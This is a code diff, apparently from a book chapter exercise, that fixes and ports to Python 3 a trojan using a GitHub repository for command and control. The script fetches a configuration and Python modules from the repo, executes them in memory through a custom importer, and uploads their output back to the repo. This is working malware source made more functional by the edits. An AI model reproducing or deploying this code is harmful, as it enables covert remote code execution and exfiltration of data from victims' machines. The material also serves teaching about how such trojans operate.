@@ -1,10 +1,10 @@
-import json, base64, sys, time, imp, random, threading, os
-import github_login
+import json, base64, sys, time, imp, random, threading, os, encodings.idna
+from github_login import GH_USERNAME, GH_PASSWORD
 from queue import Queue
 from github3 import login
 
 trojan_id = "abc" # unique id for this trojan
-relative_path = "Chapter_07/"
+relative_path = "Chapter_07/trojan/"
 trojan_config = relative_path + "config/{0}.json".format(trojan_id)
 data_path = relative_path + "data/{0}/".format(trojan_id)
 trojan_modules = []
@@ -32,7 +32,7 @@ def get_file_contents(filepath):
 def get_trojan_config():
 	global configured
 	config_json = get_file_contents(trojan_config)
-	config = json.loads(base64.b64decode(config_json))
+	config = json.loads(base64.b64decode(config_json).decode(encoding="utf-8"))
 	configured = True
 
 	for task in config:
@@ -43,7 +43,7 @@ def get_trojan_config():
 def store_module_result(data):
 	gh, repo, branch = connect_to_github()
 	remote_path = relative_path + "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 1000000))
-	repo.create_file(remote_path, "[Trojan {0}] Adding data".format(trojan_id), base64.b64encode(data))
+	repo.create_file(remote_path, "[Trojan {0}] Adding data".format(trojan_id), data.encode("utf-8"))
 
 class GitImporter(object):
 	def __init__(self):
@@ -62,7 +62,7 @@ class GitImporter(object):
 	def load_module(self, name):
 		module = imp.new_module(name)
 		exec(self.current_module_code, module.__dict__)
-		sys.modules[name] = modules
+		sys.modules[name] = module
 
 		return module
 
@@ -74,7 +74,7 @@ def module_runner(module):
 	# store the result in the repo
 	store_module_result(result)
 
-sys.meta_path = [GitImporter()]
+sys.meta_path += [GitImporter()]
 
 # main trojan loop
 while True:
